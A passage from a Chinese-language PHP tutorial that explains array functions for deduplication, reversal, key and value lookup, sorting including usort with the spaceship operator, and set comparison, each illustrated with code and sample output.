Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; a</span></span><br><span class="line"><span class="comment">    [1] =&gt; b</span></span><br><span class="line"><span class="comment">    [2] =&gt; c</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="1-7-数组去重和反转"><a href="#1-7-数组去重和反转" class="headerlink" title="1.7 数组去重和反转"></a>1.7 数组去重和反转</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_unique()</code></td><td align="center">移除重复值</td><td align="center"><code>array_unique([&quot;a&quot;,&quot;b&quot;,&quot;a&quot;]); // [&quot;a&quot;,&quot;b&quot;]</code>（优先保留前面先出的元素！）</td></tr><tr><td align="center"><code>array_reverse()</code></td><td align="center">反转数组顺序</td><td align="center"><code>array_reverse([&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]); // [&quot;c&quot;,&quot;b&quot;,&quot;a&quot;]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 去重和反转</span></span><br><span class="line"><span class="variable">$duplicates</span> = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;apple&quot;</span>, <span class="string">&quot;cherry&quot;</span>];</span><br><span class="line"><span class="variable">$unique</span> = <span class="title function_ invoke__">array_unique</span>(<span class="variable">$duplicates</span>); <span class="comment">// 此时为[&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</span></span><br><span class="line"><span class="variable">$reversed</span> = <span class="title function_ invoke__">array_reverse</span>(<span class="variable">$unique</span>); <span class="comment">// 此事为[&quot;cherry&quot;, &quot;banana&quot;, &quot;apple&quot;]</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;去重和反转: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$reversed</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">去重和反转: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; cherry</span></span><br><span class="line"><span class="comment">    [1] =&gt; banana</span></span><br><span class="line"><span class="comment">    [2] =&gt; apple</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="2-访问数组元素"><a href="#2-访问数组元素" class="headerlink" title="2. 访问数组元素"></a>2. 访问数组元素</h2><h3 id="2-1-获取所有键名"><a href="#2-1-获取所有键名" class="headerlink" title="2.1 获取所有键名"></a>2.1 获取所有键名</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_keys()</code></td><td align="center">获取所有键名</td><td align="center"><code>array_keys([&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2]); // [&quot;a&quot;,&quot;b&quot;]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取所有键名</span></span><br><span class="line"><span class="variable">$user</span> = [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">101</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>, <span class="string">&quot;email&quot;</span> =&gt; <span class="string">&quot;john@example.com&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;所有键名: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$keys</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">所有键名: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; id</span></span><br><span class="line"><span class="comment">    [1] =&gt; name</span></span><br><span class="line"><span class="comment">    [2] =&gt; email</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="2-2-获取所有值"><a href="#2-2-获取所有值" class="headerlink" title="2.2 获取所有值"></a>2.2 获取所有值</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_values()</code></td><td align="center">获取所有值</td><td align="center"><code>array_values([&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2]); // [1,2]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取所有值</span></span><br><span class="line"><span class="variable">$user</span> = [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">101</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>, <span class="string">&quot;email&quot;</span> =&gt; <span class="string">&quot;john@example.com&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$values</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;所有值: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$values</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">所有值: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; 101</span></span><br><span class="line"><span class="comment">    [1] =&gt; John</span></span><br><span class="line"><span class="comment">    [2] =&gt; john<span class="doctag">@example</span>.com</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="2-3-检查键是否存在"><a href="#2-3-检查键是否存在" class="headerlink" title="2.3 检查键是否存在"></a>2.3 检查键是否存在</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_key_exists()</code></td><td align="center">检查键是否存在</td><td align="center"><code>array_key_exists(&quot;a&quot;, $arr); // true</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查键是否存在</span></span><br><span class="line"><span class="variable">$user</span> = [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">101</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>, <span class="string">&quot;email&quot;</span> =&gt; <span class="string">&quot;john@example.com&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$hasName</span> = <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;name&quot;</span>, <span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;包含 &#x27;name&#x27; 键吗? &quot;</span> . (<span class="variable">$hasName</span> ? <span class="string">&#x27;是&#x27;</span> : <span class="string">&#x27;否&#x27;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出：包含 &#x27;name&#x27; 键吗? 是</span></span><br></pre></td></tr></table></figure><h3 id="2-4-检查值是否存在"><a href="#2-4-检查值是否存在" class="headerlink" title="2.4 检查值是否存在"></a>2.4 检查值是否存在</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>in_array()</code></td><td align="center">检查值是否存在</td><td align="center"><code>in_array(&quot;a&quot;, $arr); // true</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查值是否存在</span></span><br><span class="line"><span class="variable">$user</span> = [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">101</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>, <span class="string">&quot;email&quot;</span> =&gt; <span class="string">&quot;john@example.com&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$hasJohn</span> = <span class="title function_ invoke__">in_array</span>(<span class="string">&quot;John&quot;</span>, <span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;包含 &#x27;John&#x27; 值吗? &quot;</span> . (<span class="variable">$hasJohn</span> ? <span class="string">&#x27;是&#x27;</span> : <span class="string">&#x27;否&#x27;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出：包含 &#x27;John&#x27; 值吗? 是</span></span><br></pre></td></tr></table></figure><h3 id="2-5-搜索值位置"><a href="#2-5-搜索值位置" class="headerlink" title="2.5 搜索值位置"></a>2.5 搜索值位置</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_search()</code></td><td align="center">搜索值位置</td><td align="center"><code>array_search(&quot;a&quot;, $arr); // true</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 搜索值位置</span></span><br><span class="line"><span class="variable">$user</span> = [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">101</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>, <span class="string">&quot;email&quot;</span> =&gt; <span class="string">&quot;john@example.com&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$position</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;john@example.com&quot;</span>, <span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;email&#x27; 值的键: &quot;</span> . (<span class="variable">$position</span> !== <span class="literal">false</span> ? <span class="variable">$position</span> : <span class="string">&#x27;未找到&#x27;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出：&#x27;email&#x27; 值的键: email</span></span><br></pre></td></tr></table></figure><h2 id="3-排序数组"><a href="#3-排序数组" class="headerlink" title="3. 排序数组"></a>3. 排序数组</h2><h3 id="3-1-索引数组排序"><a href="#3-1-索引数组排序" class="headerlink" title="3.1 索引数组排序"></a>3.1 索引数组排序</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">排序依据</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>sort()</code></td><td align="center">升序排序索引数组</td><td align="center">值</td><td align="center"><code>sort($arr); // [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;] → [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</code></td></tr><tr><td align="center"><code>rsort()</code></td><td align="center">降序排序索引数组</td><td align="center">值</td><td align="center"><code>rsort($arr); // [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;] → [&quot;c&quot;,&quot;b&quot;,&quot;a&quot;]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 索引数组排序</span></span><br><span class="line"><span class="variable">$numbers</span> = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>];</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$numbers</span>);  <span class="comment">// 升序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;升序排序: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$numbers</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">升序排序: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; 1</span></span><br><span class="line"><span class="comment">    [1] =&gt; 2</span></span><br><span class="line"><span class="comment">    [2] =&gt; 3</span></span><br><span class="line"><span class="comment">    [3] =&gt; 4</span></span><br><span class="line"><span class="comment">    [4] =&gt; 5</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">rsort</span>(<span class="variable">$numbers</span>); <span class="comment">// 降序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;降序排序: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$numbers</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">降序排序: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; 5</span></span><br><span class="line"><span class="comment">    [1] =&gt; 4</span></span><br><span class="line"><span class="comment">    [2] =&gt; 3</span></span><br><span class="line"><span class="comment">    [3] =&gt; 2</span></span><br><span class="line"><span class="comment">    [4] =&gt; 1</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="3-2-关联数组排序"><a href="#3-2-关联数组排序" class="headerlink" title="3.2 关联数组排序"></a>3.2 关联数组排序</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">排序依据</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>asort()</code></td><td align="center">升序排序关联数组（保键）</td><td align="center">值</td><td align="center"><code>asort([&quot;a&quot;=&gt;3,&quot;b&quot;=&gt;1]); // [&quot;b&quot;=&gt;1,&quot;a&quot;=&gt;3]</code></td></tr><tr><td align="center"><code>ksort()</code></td><td align="center">升序按键排序关联数组</td><td align="center">键</td><td align="center"><code>ksort([&quot;b&quot;=&gt;2,&quot;a&quot;=&gt;1]); // [&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2]</code></td></tr><tr><td align="center"><code>arsort()</code></td><td align="center">降序按值排序关联数组</td><td align="center">值</td><td align="center"><code>arsort([&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;3]); // [&quot;b&quot;=&gt;3,&quot;a&quot;=&gt;1]</code></td></tr><tr><td align="center"><code>krsort()</code></td><td align="center">降序按键排序关联数组</td><td align="center">键</td><td align="center"><code>krsort([&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2]); // [&quot;b&quot;=&gt;2,&quot;a&quot;=&gt;1]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关联数组排序</span></span><br><span class="line"><span class="variable">$ages</span> = [<span class="string">&quot;John&quot;</span> =&gt; <span class="number">25</span>, <span class="string">&quot;Jane&quot;</span> =&gt; <span class="number">30</span>, <span class="string">&quot;Jim&quot;</span> =&gt; <span class="number">20</span>];</span><br><span class="line"><span class="title function_ invoke__">asort</span>(<span class="variable">$ages</span>); <span class="comment">// 按值升序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;按值升序: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$ages</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">按值升序: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [Jim] =&gt; 20</span></span><br><span class="line"><span class="comment">    [John] =&gt; 25</span></span><br><span class="line"><span class="comment">    [Jane] =&gt; 30</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">ksort</span>(<span class="variable">$ages</span>); <span class="comment">// 按键升序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;按键升序: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$ages</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">按键升序: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [Jane] =&gt; 30</span></span><br><span class="line"><span class="comment">    [Jim] =&gt; 20</span></span><br><span class="line"><span class="comment">    [John] =&gt; 25</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">arsort</span>(<span class="variable">$ages</span>); <span class="comment">// 按值降序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;按值降序: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$ages</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">按值降序: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [Jane] =&gt; 30</span></span><br><span class="line"><span class="comment">    [John] =&gt; 25</span></span><br><span class="line"><span class="comment">    [Jim] =&gt; 20</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">krsort</span>(<span class="variable">$ages</span>); <span class="comment">// 按键降序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;按键降序: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$ages</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">按键降序: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [John] =&gt; 25</span></span><br><span class="line"><span class="comment">    [Jim] =&gt; 20</span></span><br><span class="line"><span class="comment">    [Jane] =&gt; 30</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="3-3-自定义排序"><a href="#3-3-自定义排序" class="headerlink" title="3.3 自定义排序"></a>3.3 自定义排序</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">排序依据</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">自定义排序</td><td align="center">通过回调函数排序</td><td align="center">-</td><td align="center"><code>usort($arr, fn($a,$b) =&gt; $a[&quot;name&quot;] &lt;=&gt; $b[&quot;name&quot;]);</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义排序</span></span><br><span class="line"><span class="variable">$products</span> = [</span><br><span class="line">    [<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Laptop&quot;</span>, <span class="string">&quot;price&quot;</span> =&gt; <span class="number">999</span>],</span><br><span class="line">    [<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Mouse&quot;</span>, <span class="string">&quot;price&quot;</span> =&gt; <span class="number">25</span>],</span><br><span class="line">    [<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Keyboard&quot;</span>, <span class="string">&quot;price&quot;</span> =&gt; <span class="number">50</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$products</span>, function(<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>[<span class="string">&quot;price&quot;</span>] &lt;=&gt; <span class="variable">$b</span>[<span class="string">&quot;price&quot;</span>];</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;按价格排序: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$products</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">按价格排序: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; Array</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [name] =&gt; Mouse</span></span><br><span class="line"><span class="comment">            [price] =&gt; 25</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [1] =&gt; Array</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [name] =&gt; Keyboard</span></span><br><span class="line"><span class="comment">            [price] =&gt; 50</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [2] =&gt; Array</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [name] =&gt; Laptop</span></span><br><span class="line"><span class="comment">            [price] =&gt; 999</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释：</strong><ol><li>首先我们使用变量<code>$products</code>定义了一个二维数组，它包含三个产品，每一个产品都是一个关联数组，它们包含<code>name</code>和<code>price</code>两个键。初始的顺序为：<code>Laptop</code> → <code>Mouse</code> → <code>keyboard</code>。</li><li><code>usort()</code>函数的两个参数比较特殊，可以使第一个参数：<code>$products</code>（本示例代码中的例子，可更换），通过第二个参数：一个匿名函数，中所定义的比较算法来对数组进行排序。</li><li>在匿名函数中参数<code>$a</code>和参数<code>$b</code>分别指代两个产品数组。而<code>$a[&quot;price&quot;] &lt;=&gt; $b[&quot;price&quot;]</code>则通过太空船运算符<code>&lt;=&gt;</code>来比较两个产品的价格值，最后可能返回的结果有三种：<ul><li>如果 <code>$a</code> 价格 &lt; <code>$b</code> 价格 → 返回 <code>-1</code>，<code>$a</code> 排在前面。</li><li>如果 <code>$a</code> 价格 &#x3D; <code>$b</code> 价格 → 返回 <code>0</code>，位置不变。</li><li>如果 <code>$a</code> 价格 &gt; <code>$b</code> 价格 → 返回 <code>1</code>，<code>$b</code> 排在前面。</li></ul></li><li>最后将比较的结果返回，我们就得到了排序好的数组了。</li></ol></li></ul><h2 id="4-比较数组"><a href="#4-比较数组" class="headerlink" title="4. 比较数组"></a>4. 比较数组</h2><h3 id="4-1-值比较"><a href="#4-1-值比较" class="headerlink" title="4.1 值比较"></a>4.1 值比较</h3><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_diff()</code></td><td align="center">返回差集（值比较）</td><td align="center"><code>array_diff([1,2,3], [2,3]); // [1]</code></td></tr><tr><td align="center"><code>array_intersect()</code></td><td align="center">返回交集（值比较）</td><td align="center"><code>array_intersect([1,2,3], [2,3]); // [2,3]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 值比较</span></span><br><span class="line"><span class="variable">$set1</span> = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="variable">$set2</span> = [<span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>, <span class="string">&quot;yellow&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$diff</span> = <span class="title function_ invoke__">array_diff</span>(<span class="variable">$set1</span>, <span class="variable">$set2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;差集(值): &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$diff</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">差集(值): Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; red</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$intersect</span> = <span class="title function_ invoke__">array_intersect</span>(<span class="variable">$set1</span>, <span class="variable">$set2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;交集(值): &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$intersect</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">交集(值): Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [1] =&gt; green</span></span><br><span class="line"><span class="comment">    [2] =&gt; blue</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="4-2-键值比较"><a href="#4-2-键值比较" class="headerlink" title="4.2 键值比较"></a>4.2 键值比较</h3><table><thead><tr><th align="center">函数</th><th 